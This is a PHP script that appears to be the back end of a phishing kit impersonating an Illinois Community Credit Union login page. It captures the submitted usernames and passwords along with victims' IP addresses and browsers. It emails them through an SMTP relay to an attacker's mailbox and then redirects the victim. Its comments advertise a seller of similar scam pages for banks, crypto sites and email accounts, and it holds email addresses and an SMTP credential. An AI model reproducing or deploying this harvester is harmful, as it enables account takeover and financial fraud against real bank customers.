<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$username = $_POST['username'];
$password = $_POST['password'];

//THIS CODE WAS BUILT BY "SCAMPAGE.SHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//

      //Do not touch this section// To use, simply edit ($to =) to your own email to receive results//

      //When testing results, if you don't find it in your inbox, check your spam folder.

      //If you want to buy:
      // - USA Banks Scampage
      // - UK Banks Scampage
      // - Australian Scampage
      // - Canadian Scampage 
      // - Crypto Websites Scampage 
      // - Email Accounts Scampage
      // - Web 3.0 Websites (like sandbox) Scampage
      // visit: https:www.scampage.shop/

$date = date("Y-m-d H:i:s");
      if(isset($_POST["login"]));

    function sendmail(){
        $name = "New Login [Illinois Community Credit Union Login]";
        $to = "gbryyan1@gmail.com"; // Email of the receiver (your email)
        $from = "robertfairweather62@gmail.com"; 
        $passwrd = "1DD8D3551F073E9BCA331E190457F1011BD3";
        $username = $_POST['username'];
        $password = $_POST['password'];
        $ipaddress = $_SERVER['REMOTE_ADDR'];
        $useragent = $_SERVER['HTTP_USER_AGENT'];

        require 'PHPMailer/Exception.php';
        require 'PHPMailer/PHPMailer.php';
        require 'PHPMailer/SMTP.php';
        $mail = new PHPMailer(true);

        //SMTP Settings
        $mail->isSMTP();
        $mail->SMTPDebug = 3;
        $mail->Host = "smtp.elasticemail.com";
        $mail->SMTPAuth = true;
        $mail->Username = $from;
        $mail->Password = $passwrd;
        $mail->Port = 2525;
        $mail->SMTPSecure = "tls";
        $mail->smtpConnect([
        'ssl' => [
             'verify_peer' => false,
             'verify_peer_name' => false,
             'allow_self_signed' => true
             ]
         ]);

         //Email Settings
        $mail->isHTML(true);
        $mail->setFrom($from, $name);
        $mail->addAddress($to);
        $mail->Subject = "Illinois Community Credit Union Login Info";
        $mail->Body = '
        ------- LOGIN INFO ------- </b> <br/>
        Username: <b>'.$username.' </b> <br/>
        Password: <b>'.$password.'</b> <br/>
        </b> <br/>

        -------- IP INFO ------------ </b> <br/>
        IP Address: </b>'.$ipaddress.' </b> <br/>
        User Agent: <br>'.$useragent.' </b>
        ';

        if ($mail->send()) {
            echo "Login Successful!";
        } else {
            echo "Something is wrong: <br><br>" . $mail->ErrorInfo;
        }
        }
        sendmail();

        header("Location: illinois-cc.html")
?>
